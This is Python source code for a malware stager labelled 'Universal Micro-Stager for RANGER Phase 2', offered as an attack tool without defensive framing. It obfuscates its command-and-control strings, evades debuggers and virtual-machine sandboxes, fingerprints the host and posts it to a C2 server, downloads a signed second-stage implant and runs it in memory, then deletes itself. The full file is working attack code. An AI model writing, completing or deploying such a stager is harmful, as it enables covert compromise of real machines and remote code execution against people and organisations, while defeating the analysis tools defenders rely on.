#!/usr/bin/env python3
"""
Universal Micro-Stager for RANGER Phase 2

"""

import os
import sys
import time
import json
import base64
import hashlib
import platform
import urllib.request
import urllib.parse
import random
import socket
import subprocess
import tempfile
import importlib.abc
import importlib.util
from typing import Dict, List, Optional, Tuple, Any, Set
import ssl

# ---------- Advanced string obfuscation ----------
_MASTER_KEY = b'R0gu3R4NG3R_M45t3r_K3y_2026'  # 24 bytes; rotate periodically

def _decrypt_string(enc_data: bytes) -> str:
    """Decrypt a string using per‑nonce derived key."""
    nonce = enc_data[:16]
    ciphertext = enc_data[16:]
    key = hashlib.sha256(_MASTER_KEY + nonce).digest()
    dec = bytes(ciphertext[i] ^ key[i % len(key)] for i in range(len(ciphertext)))
    return dec.decode('utf-8')

def d(s: str) -> str:
    """Decode base64, then decrypt."""
    return _decrypt_string(base64.b64decode(s))

# All sensitive strings are stored encrypted (replace with your own)
C2_URLS = [
    d('BASE64_ENCRYPTED_STRING_1'),
    d('BASE64_ENCRYPTED_STRING_2')
]
HANDSHAKE_PATH = d('BASE64_ENCRYPTED_HANDSHAKE')
STAGE2_PATH = d('BASE64_ENCRYPTED_STAGE2')
USER_AGENTS = [
    d('BASE64_ENCRYPTED_UA_1'),
    d('BASE64_ENCRYPTED_UA_2')
]

# Ed25519 public key (embedded, encrypted)
PUBLIC_KEY_B64 = d('BASE64_ENCRYPTED_PUBKEY')

try:
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
    from cryptography.exceptions import InvalidSignature
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# ---------- Platform detection ----------
IS_WINDOWS = platform.system().lower() == 'windows'
IS_LINUX   = platform.system().lower() == 'linux'
IS_MACOS   = platform.system().lower() == 'darwin'

ARCH = platform.machine()
HOSTNAME = platform.node()

# ---------- Lightweight anti-analysis helpers ----------
def _get_mac() -> str:
    try:
        import uuid
        mac = uuid.getnode()
        if (mac >> 40) % 2 == 0:
            return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
    except:
        pass
    return ''

def _get_disk_serial() -> str:
    if IS_WINDOWS:
        try:
            out = subprocess.check_output('wmic diskdrive get serialnumber', shell=True, timeout=5)
            return out.decode().strip().split('\n')[-1].strip()
        except:
            pass
    elif IS_LINUX:
        try:
            with open('/etc/machine-id', 'r') as f:
                return f.read().strip()
        except:
            pass
    return ''

def _check_debugger() -> bool:
    """Detect debugger via OS APIs (low‑noise)."""
    if IS_WINDOWS:
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            return kernel32.IsDebuggerPresent() != 0
        except:
            pass
    elif IS_LINUX:
        try:
            with open('/proc/self/status', 'r') as f:
                for line in f:
                    if line.startswith('TracerPid:'):
                        return line.split()[1] != '0'
        except:
            pass
    return False

def _check_sandbox_mac() -> bool:
    """Check if MAC address matches known VM OUI (lightweight)."""
    mac = _get_mac()
    if mac:
        vm_ouis = ['00:50:56', '00:0C:29', '00:05:69', '08:00:27']
        for o in vm_ouis:
            if mac.startswith(o):
                return True
    return False

def _timing_evasion(min_delay=5, max_delay=15):
    time.sleep(random.uniform(min_delay, max_delay))

# ---------- Hardware fingerprint ----------
def _generate_fingerprint() -> str:
    mac = _get_mac()
    disk = _get_disk_serial()
    data = f"{mac}:{disk}:{HOSTNAME}:{platform.system()}:{ARCH}"
    return hashlib.sha256(data.encode()).hexdigest()[:32]

# ---------- Memory-only module loader ----------
class _MemLoader(importlib.abc.Loader):
    def __init__(self, code: str):
        self.code = code
    def exec_module(self, module):
        exec(self.code, module.__dict__)

def _load_module(name: str, code: str):
    spec = importlib.util.spec_from_loader(name, loader=_MemLoader(code))
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module

# ---------- Core Stager ----------
class _S:
    def __init__(self, debug=False):
        self.cfg = self._load_cfg()
        self.fp = _generate_fingerprint()
        self.debug = debug
        self.skey = None
        self.base = None
        self.seen_nonces: Set[str] = set()
        self.ctx = ssl.create_default_context()
        # Optionally load custom CA
        # self.ctx.load_verify_locations(cafile='ca.pem')

    def _load_cfg(self) -> Dict:
        return {
            'c2_urls': C2_URLS,
            'handshake': HANDSHAKE_PATH,
            'stage2': STAGE2_PATH,
            'timeout': 30,
            'retries': 3,
            'jitter': (5, 15),
            'min_uptime': 300,
            'min_disk_gb': 10,
            'self_destruct': True
        }

    def _log(self, msg: str):
        if self.debug:
            print(f"[STAGER] {msg}")

    # -----------------------------------------------------------------
    # Minimal Safety Checks
    # -----------------------------------------------------------------
    def _run_checks(self) -> bool:
        """Return True if environment seems safe (low confidence)."""
        checks_passed = 0

        # Uptime check (lightweight)
        try:
            if IS_LINUX:
                with open('/proc/uptime') as f:
                    uptime = float(f.read().split()[0])
                if uptime >= self.cfg['min_uptime']:
                    checks_passed += 1
            elif IS_WINDOWS:
                import ctypes
                ticks = ctypes.windll.kernel32.GetTickCount64() / 1000
                if ticks >= self.cfg['min_uptime']:
                    checks_passed += 1
            elif IS_MACOS:
                import subprocess
                out = subprocess.check_output(['sysctl', '-n', 'kern.boottime'], text=True)
                boot = int(out.split()[3].rstrip(','))
                uptime = int(time.time()) - boot
                if uptime >= self.cfg['min_uptime']:
                    checks_passed += 1
        except:
            pass

        # Disk size check (lightweight)
        try:
            if IS_LINUX or IS_MACOS:
                import shutil
                usage = shutil.disk_usage('/')
                total_gb = usage.total / (1024**3)
                if total_gb >= self.cfg['min_disk_gb']:
                    checks_passed += 1
            elif IS_WINDOWS:
                import ctypes
                kernel32 = ctypes.windll.kernel32
                total_bytes = ctypes.c_ulonglong(0)
                kernel32.GetDiskFreeSpaceExW('C:\\', None, ctypes.byref(total_bytes), None)
                total_gb = total_bytes.value / (1024**3)
                if total_gb >= self.cfg['min_disk_gb']:
                    checks_passed += 1
        except:
            pass

        # Debugger presence (lightweight)
        if not _check_debugger():
            checks_passed += 1

        # MAC OUI check (lightweight)
        if not _check_sandbox_mac():
            checks_passed += 1

        # Require at least 3 out of 4 checks to pass
        return checks_passed >= 3

    # -----------------------------------------------------------------
    # C2 Communication
    # -----------------------------------------------------------------
    def _jitter(self):
        time.sleep(random.uniform(*self.cfg['jitter']))

    def _handshake(self, base: str) -> bool:
        url = base.rstrip('/') + self.cfg['handshake']
        try:
            data = {
                'fp': self.fp,
                'platform': platform.system(),
                'arch': ARCH,
                'ts': int(time.time())
            }
            req = urllib.request.Request(url, data=json.dumps(data).encode(),
                                         headers={'Content-Type': 'application/json'},
                                         method='POST')
            with urllib.request.urlopen(req, timeout=self.cfg['timeout'],
                                        context=self.ctx) as resp:
                if resp.getcode() == 200:
                    j = json.loads(resp.read().decode())
                    if 'key' in j:
                        self.skey = j['key'].encode()
                        self.base = base
                        self._log(f"Handshake successful with {base}")
                        return True
        except Exception as e:
            self._log(f"Handshake error: {e}")
        return False

    def _verify_sig(self, payload: bytes, sig_b64: str, ts: int, nonce: str) -> bool:
        if not CRYPTO_AVAILABLE:
            return False
        try:
            pub = Ed25519PublicKey.from_public_bytes(base64.b64decode(PUBLIC_KEY_B64))
            sig = base64.b64decode(sig_b64)
            now = int(time.time())
            if abs(now - ts) > 300:
                self._log("Timestamp out of window")
                return False
            if len(nonce) < 8 or nonce in self.seen_nonces:
                self._log("Replay detected")
                return False
            self.seen_nonces.add(nonce)
            data = payload + str(ts).encode() + nonce.encode()
            pub.verify(sig, data)
            return True
        except InvalidSignature:
            self._log("Invalid signature")
        except Exception as e:
            self._log(f"Signature verification error: {e}")
        return False

    def download_stage2(self) -> Tuple[bool, Optional[bytes]]:
        self._log("Downloading Stage 2")
        _timing_evasion(2, 8)

        if not self._run_checks():
            self._log("Safety checks failed, going dormant")
            time.sleep(3600 + random.randint(0, 600))
            if not self._run_checks():
                return False, None

        for base in self.cfg['c2_urls']:
            self._jitter()
            if not self.skey:
                if not self._handshake(base):
                    continue

            stage2_url = base.rstrip('/') + self.cfg['stage2']
            try:
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                req = urllib.request.Request(stage2_url, headers=headers, method='GET')
                with urllib.request.urlopen(req, timeout=self.cfg['timeout'],
                                            context=self.ctx) as resp:
                    if resp.getcode() == 200:
                        sig = resp.headers.get('X-Signature')
                        ts = resp.headers.get('X-Timestamp')
                        nonce = resp.headers.get('X-Nonce')
                        if not (sig and ts and nonce):
                            self._log("Missing signature metadata")
                            continue
                        try:
                            ts = int(ts)
                        except:
                            continue
                        data = resp.read()
                        if self._verify_sig(data, sig, ts, nonce):
                            self._log("Signature verified")
                            return True, data
                        else:
                            self._log("Invalid signature")
            except Exception as e:
                self._log(f"Download error: {e}")

            self.skey = None
            self.base = None

        self._log("All download attempts failed")
        return False, None

    # -----------------------------------------------------------------
    # Payload Execution (Memory‑only) – passes env vars to implant
    # -----------------------------------------------------------------
    def _exec_py(self, data: bytes) -> bool:
        # Prepare environment for implant
        if self.skey:
            os.environ['ROGUE_SESSION_KEY'] = base64.b64encode(self.skey).decode()
        if self.base:
            # Parse host and port from base URL
            parsed = urllib.parse.urlparse(self.base)
            c2_host = parsed.hostname
            c2_port = parsed.port or 443
            implant_config = {
                'c2_host': c2_host,
                'c2_port': c2_port,
                'beacon_interval': 60,
                'use_phase1': True
            }
            os.environ['ROGUE_CONFIG'] = json.dumps(implant_config)
        os.environ['ROGUE_STAGE2'] = '1'   # indicate stage2

        try:
            code = data.decode('utf-8')
            mod = _load_module("rogue_implant", code)
            if hasattr(mod, 'main'):
                import threading
                t = threading.Thread(target=mod.main)
                t.daemon = True
                t.start()
                self._log("Implant started")
                return True
        except Exception as e:
            self._log(f"Python exec error: {e}")
        return False

    # -----------------------------------------------------------------
    # Self‑Destruct
    # -----------------------------------------------------------------
    def _self_destruct(self):
        if not self.cfg.get('self_destruct'):
            return
        try:
            exe = sys.argv[0]
            if IS_WINDOWS:
                # Use a batch file to delete after exit (common in installers)
                with open('delme.bat', 'w') as f:
                    f.write(f"@echo off\nping 127.0.0.1 -n 3 > nul\ndel {exe}\n")
                subprocess.Popen('delme.bat', shell=True)
            else:
                os.unlink(exe)
            self._log("Self-destruct initiated")
        except Exception as e:
            self._log(f"Self-destruct error: {e}")

    # -----------------------------------------------------------------
    # Main
    # -----------------------------------------------------------------
    def run(self) -> bool:
        print(f"Universal Stager - {platform.system()} {ARCH}")
        ok, stage2 = self.download_stage2()
        if not ok:
            return False

        if self._exec_py(stage2):
            self._self_destruct()
            return True

        return False

def main():
    # Enable debug logging via environment variable (optional)
    debug = os.environ.get('ROGUE_DEBUG', '').lower() in ('1', 'true', 'yes')
    s = _S(debug=debug)
    try:
        return 0 if s.run() else 1
    except KeyboardInterrupt:
        return 130
    except Exception as e:
        if debug:
            print(f"Unhandled exception: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
